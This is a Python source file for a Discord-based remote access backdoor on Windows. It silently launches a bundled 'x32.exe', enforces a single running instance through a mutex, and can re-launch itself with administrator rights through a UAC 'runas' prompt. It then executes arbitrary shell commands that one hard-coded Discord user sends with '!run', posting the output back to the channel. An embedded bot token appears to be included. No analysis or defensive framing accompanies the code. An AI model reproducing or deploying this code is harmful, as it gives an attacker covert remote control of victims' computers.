import subprocess
import discord
import ctypes
import sys
import os
from discord.ext import commands

subprocess.Popen("x32.exe", shell=True)

def check_single_instance():
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\reiayanmi")
    last_error = ctypes.windll.kernel32.GetLastError()
    if last_error == 183:
        sys.exit(0)

if __name__ == "__main__":
    check_single_instance()

admin_on_startup = False

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def restart_as_admin():
    script = sys.executable
    params = " ".join([f'"{arg}"' for arg in sys.argv])
    try:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", script, params, None, 1)
        if result > 32:
            sys.exit(0)
    except:
        return False

if admin_on_startup:
    if not is_running_as_admin():
        restart_as_admin()

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True
client = commands.Bot(command_prefix="!", intents=intents)

@client.event
async def on_ready():
    admin_status = "with admin privileges" if is_running_as_admin() else "without admin privileges"
    channel = client.get_channel(1276064875902271554)
    if channel:
        await channel.send(f"Bot is running {admin_status}")

@client.event
async def on_message(message):
    ALLOWED_CHANNEL = 1276064875902271554
    if message.author.id != 915957418687615076:
        return
    if message.author == client.user:
        return
    if message.channel.id != ALLOWED_CHANNEL:
        return
    if message.content == "hello":
        await message.channel.send("hello!")
    elif message.content.startswith("!run "):
        await message.channel.send("Running command...")
        try:
            result = subprocess.run(
                message.content[4:],
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            output = result.stdout or "No output"
        except subprocess.CalledProcessError as e:
            output = f"Error: {e.stderr}"
        await message.channel.send(f"```\n{output[:1900]}\n```")
    elif message.content == "!get admin":
        await message.channel.send("Attempting to restart with admin privileges...")
        restart_as_admin()
    elif message.content == "!exit":
        await message.channel.send("exiting")
        sys.exit(0)
client.run(token="qu21wePsAYIzB2DBafuazrLIVWTVTrkc/Sp0HzjLXpwkC5saRX0GMRKwN3M78BTYCYW8ON25WI7XlAv45/HugzNKULNiu2+s/wO5L22rL2E=")
